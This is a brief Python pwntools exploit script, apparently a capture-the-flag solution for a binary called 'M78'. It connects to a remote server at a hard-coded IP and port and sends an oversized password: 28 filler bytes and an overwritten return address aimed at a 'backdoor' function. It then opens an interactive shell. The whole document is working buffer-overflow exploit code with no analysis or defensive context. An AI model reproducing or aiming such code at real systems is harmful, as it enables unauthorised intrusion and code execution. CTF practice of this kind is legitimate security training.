#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./M78")
sh = remote("39.96.88.40",7010)
elf = ELF("./M78")
backdoor_addr = 0x8049202
sh.recvuntil("Your choice?")
sh.sendline("1")
sh.recvuntil("Please choose a building\n")
s = "aaaa"
sh.sendline(s)
sh.recvuntil("Please input the password\n")
dest =  'a' * 28 + p32(backdoor_addr)
dest = dest.ljust(0x106,'a')
sh.sendline(dest)
sh.interactive()